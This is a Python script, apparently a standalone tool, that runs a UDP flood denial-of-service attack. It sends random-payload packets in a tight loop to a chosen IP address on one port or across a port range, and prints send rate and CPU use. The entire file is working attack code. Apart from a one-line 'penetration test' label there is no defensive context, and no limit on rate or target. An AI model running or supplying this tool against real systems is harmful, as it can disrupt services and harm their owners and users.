# UDP-Flood-Attack

if __name__ != "__main__":
    exit()

__version__ = "1.0"

import sys
import time
import random
import socket
import threading

help_ = """UDP flood attack tool (penetration test) - 1.0
python3 udp-flood-attack.py [ip] [port:port or port] [packet payload size]"""

target_port_t = 1

if len(sys.argv) != 4:
    print(help_)
    exit()
if sys.argv[2].find(":") > 0:
    target_port_t = 2
    target_port = sys.argv[2].split(":")
    if int(target_port[0]) >= int(target_port[1]):
        print("arguments error")
        exit()
    target_port = [int(target_port[0]), int(target_port[1])]
else:
    target_port = int(sys.argv[2])

target_ip = sys.argv[1]
stop = True
count = 0
count_old = 0
payload_size = int(sys.argv[3])
packet = random._urandom(payload_size)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def udp_flood_static_port():
    global count
    while (stop):
        sock.sendto(packet, (target_ip, target_port))
        count += 1

def udp_flood_table_port():
    global count
    port = 0
    start = target_port[0]
    end = target_port[1] + 1
    while (stop):
        sock.sendto(packet, (target_ip, port))
        count += 1
        port += 1
        if port == end:
            port = start

if target_port_t == 1:
    thread_ = threading.Thread(target=udp_flood_static_port)
elif target_port_t == 2:
    thread_ = threading.Thread(target=udp_flood_table_port)

thread_.start()
time_start = time.time()

time_0 = time.time()
process_time_0 = time.process_time()

try:
    time.sleep(0.1)
    while (True):
        count_ = count_old
        count_old = count
        time_ = time_0
        time_0 = time.time()
        process_time_ = process_time_0
        process_time_0 = time.process_time()
        cpu_use = "%.2f" % (((process_time_0 - process_time_) / (time_0 - time_)) * 100)
        print(
            "[ " + str(int(time.time() - time_start)) + " ] cpu_use " + cpu_use +
            "% Bytes sent " + str(count_old) + " speed " + str(count_old - count_) + "sent/sec" +
            " sent_size " + str(int((count_old * payload_size) / 1024 / 1024)) + "MB speed " +
            ("%.5f" % (((count_old - count_) * payload_size) / 1024 / 1024)) + "MB/s"
        )
        time.sleep(1)
except:
    stop = False
    thread_.join()
